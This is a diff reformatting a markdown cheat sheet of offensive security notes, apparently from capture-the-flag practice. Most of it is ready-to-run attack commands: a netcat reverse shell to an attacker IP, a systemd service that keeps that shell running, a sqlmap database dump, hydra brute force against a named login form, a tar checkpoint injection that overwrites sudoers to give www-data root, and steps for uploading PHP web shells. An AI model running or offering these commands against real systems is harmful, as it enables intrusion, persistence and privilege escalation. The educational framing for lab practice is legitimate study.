@@ -1,108 +1,142 @@
 # Offensive Security Notes for Educational Purpose Only
 
-# .phtml for Shell
-# .phtml files are commonly used as PHP web shells for remote code execution. These files can be uploaded to vulnerable servers for exploitation.
+## .phtml for Shell
+.phtml files are commonly used as PHP web shells for remote code execution. These files can be uploaded to vulnerable servers for exploitation.
 
-# Finding SUID Files (Privileged File Search)
-# SUID files can be a vector for privilege escalation. This command searches for all files owned by root with the SUID bit set.
+## Finding SUID Files (Privileged File Search)
+SUID files can be a vector for privilege escalation. This command searches for all files owned by root with the SUID bit set.
+```
 find / -user root -perm -4000 -exec ls -ldb {} \;
+```
 
-# Reverse Shell Setup
+## Reverse Shell Setup
 
-# Creating a Reverse Shell
-# This command creates a reverse shell that connects back to the attacker's IP (10.8.1.72) on port 1337. It uses netcat to establish the connection.
+### Creating a Reverse Shell
+This command creates a reverse shell that connects back to the attacker's IP (10.8.1.72) on port 1337. It uses netcat to establish the connection.
+```
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.72 1337 >/tmp/f" > /tmp/shell.sh
+```
 
-# Creating a Service to Execute the Reverse Shell
-# This sequence creates a systemd service that executes the reverse shell automatically.
+### Creating a Service to Execute the Reverse Shell
+This sequence creates a systemd service that executes the reverse shell automatically.
+```
 TF=$(mktemp).service
 echo '[Service] Type=oneshot ExecStart=/bin/sh -c "bash /tmp/shell.sh" [Install] WantedBy=multi-user.target' > $TF
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
+```
 
-# Finding Flags
-# Searching for potential flag files across the system.
+## Finding Flags
+Searching for potential flag files across the system.
+```
 dir flag* /s /p
 search -f "flag*"
+```
 
-# Reverse Image Search
-# TinyEye (https://www.tineye.com/) can be used for reverse image searches to find where images might be used elsewhere on the web.
+## Reverse Image Search
+TinyEye (https://www.tineye.com/) can be used for reverse image searches to find where images might be used elsewhere on the web.
 
-# SQL Injection Example
-# Using sqlmap to perform automated SQL injection attacks and dump the database (if vulnerable).
+## SQL Injection Example
+Using sqlmap to perform automated SQL injection attacks and dump the database (if vulnerable).
+```
 sqlmap -r req.txt --dbms=mysql --dump
+```
 
-# Networking Tools
+## Networking Tools
 
-# Check active socket connections and open ports using ss (socket statistics).
+### Check active socket connections and open ports using ss (socket statistics).
+```
 ss -tulpn
+```
 
-# Basic Information Gathering
+## Basic Information Gathering
 
-# Display the current user to check which user you're logged in as.
+### Display the current user to check which user you're logged in as.
+```
 whoami
+```
 
-# From MSF Shell to Root (PTY Shell Upgrade)
-# Use Python to spawn an interactive shell (PTY) for better control and interaction.
+## From MSF Shell to Root (PTY Shell Upgrade)
+Use Python to spawn an interactive shell (PTY) for better control and interaction.
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-# SMBClient Example (Accessing SMB Shares)
-# Access an anonymous SMB share on a target system to explore its files.
+## SMBClient Example (Accessing SMB Shares)
+Access an anonymous SMB share on a target system to explore its files.
+```
 smbclient //10.10.233.236/anonymous -N
+```
 
-# Hydra for Brute Force Attacks
-# Use Hydra to brute-force login credentials on a web application using the POST method.
+## Hydra for Brute Force Attacks
+Use Hydra to brute-force login credentials on a web application using the POST method.
+```
 hydra -l milesdyson -P log1.txt 10.10.174.36 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
+```
 
-# Gobuster for Directory Busting
-# Use Gobuster to search for hidden directories or files on a web server.
+## Gobuster for Directory Busting
+Use Gobuster to search for hidden directories or files on a web server.
+```
 gobuster dir -u http://10.10.233.236/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
+```
 
-# Pentest Monkey Web Shells
+## Pentest Monkey Web Shells
 
-# Pentest Monkey (https://pentestmonkey.net/) provides a variety of web shells for different web server environments (Apache, IIS, PHP, etc.).
-# These web shells can be used for further exploration and exploitation once access is gained on a target machine.
+Pentest Monkey (https://pentestmonkey.net/) provides a variety of web shells for different web server environments (Apache, IIS, PHP, etc.).
+These web shells can be used for further exploration and exploitation once access is gained on a target machine.
 
-# Example: Upload a PHP reverse shell (for educational purposes only)
-# Web shells allow an attacker to interact with the target system remotely. You can use these to upload reverse shells or execute commands.
-# You can find various web shells in the following location: https://pentestmonkey.net/tools/web-shells
+### Example: Upload a PHP reverse shell (for educational purposes only)
+1. Create a PHP reverse shell (example: php-reverse-shell.php)
+2. Upload the shell to a vulnerable server (e.g., via file upload functionality)
+3. Once uploaded, access the shell by visiting its URL in the browser
 
-# Example of PHP reverse shell:
-# 1. Create a PHP reverse shell (example: php-reverse-shell.php)
-# 2. Upload the shell to a vulnerable server (e.g., via file upload functionality)
-# 3. Once uploaded, access the shell by visiting its URL in the browser
+## Privilege Escalation via Cron Jobs
+Misconfigurations in cron jobs can provide opportunities for privilege escalation if certain users or processes are allowed to run commands with elevated privileges.
+For example, a poorly configured cron job may allow a user with low privileges to execute arbitrary commands as root.
 
-# Privilege Escalation via Cron Jobs
-# Misconfigurations in cron jobs can provide opportunities for privilege escalation if certain users or processes are allowed to run commands with elevated privileges.
-# For example, a poorly configured cron job may allow a user with low privileges to execute arbitrary commands as root.
-
-# Example Privilege Escalation via Cron Jobs
-# Identify cron jobs owned by root or a privileged user and look for potential vulnerabilities (e.g., world-writable files, wrong permissions).
+### Example Privilege Escalation via Cron Jobs
+Identify cron jobs owned by root or a privileged user and look for potential vulnerabilities (e.g., world-writable files, wrong permissions).
+```
 crontab -l # List cron jobs for the current user
 cat /etc/crontab # View system-wide cron jobs
+```
 
-# Privilege Escalation Example (Sudoers Exploit)
-# The following sequence demonstrates privilege escalation by modifying the sudoers file to grant the 'www-data' user root privileges.
-# This can be used to escalate from a web user (e.g., www-data) to root on the target system.
+## Privilege Escalation Example (Sudoers Exploit)
+The following sequence demonstrates privilege escalation by modifying the sudoers file to grant the 'www-data' user root privileges.
+This can be used to escalate from a web user (e.g., www-data) to root on the target system.
 
-# Step 1: Navigate to the web directory
+### Step 1: Navigate to the web directory
+```
 cd /var/www/html
+```
 
-# Step 2: Create a script that modifies the sudoers file
+### Step 2: Create a script that modifies the sudoers file
+```
 echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > priv.sh
+```
 
-# Step 3: Attempt to execute the script (this step attempts to misuse a checkpoint to trigger execution of the script)
+### Step 3: Attempt to execute the script (this step attempts to misuse a checkpoint to trigger execution of the script)
+```
 echo "/var/www/html" > "--checkpoint-action=exec=sh priv.sh"
 echo "/var/www/html" > --checkpoint=1
+```
 
-# Step 4: Check sudo permissions to see if we now have escalated privileges
+### Step 4: Check sudo permissions to see if we now have escalated privileges
+```
 sudo -l
+```
 
-# Step 5: If the above command shows that we can run commands as root without a password, escalate privileges
+### Step 5: If the above command shows that we can run commands as root without a password, escalate privileges
+```
 sudo bash
+```
 
-# Step 6: Read the root flag (assuming this is a capture-the-flag type challenge)
+### Step 6: Read the root flag (assuming this is a capture-the-flag type challenge)
+```
 cat /root/root.txt
+```
+
+
 
 
 
